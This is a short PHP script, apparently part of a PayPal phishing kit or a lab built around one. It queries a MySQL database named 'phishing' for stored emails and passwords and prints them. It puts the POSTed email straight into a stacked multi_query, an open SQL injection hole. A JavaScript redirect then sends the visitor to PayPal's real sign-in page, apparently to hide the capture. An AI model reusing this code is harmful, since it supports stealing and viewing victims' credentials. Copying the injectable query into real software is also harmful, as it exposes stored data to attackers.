<?php

// connection details
$servername = "127.0.0.1"; 
$username = "root";        
$password = "";            
$dbname = "phishing";      

// connection to database
$conn = new mysqli($servername, $username, $password, $dbname);

if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

$email = $_POST['email'];

$sql = "SELECT * FROM credentials WHERE email = '$email'";
echo "Executing query: $sql<br>";

// executes
if ($conn->multi_query($sql)) {
    do {
        
        if ($result = $conn->store_result()) {
            echo "<h2>Search Results:</h2>";
            while ($row = $result->fetch_assoc()) {
                echo "Email: " . $row["email"] . " - Password: " . $row["password"] . "<br>";
            }
            $result->free();
        }
    } while ($conn->more_results() && $conn->next_result());
} else {
    echo "Error executing query: " . $conn->error;
}

// closes
$conn->close();
?>

<script>
setTimeout(function() {
    // redirect
    window.location.href = "https://www.paypal.com/signin";
}, 0);
</script>
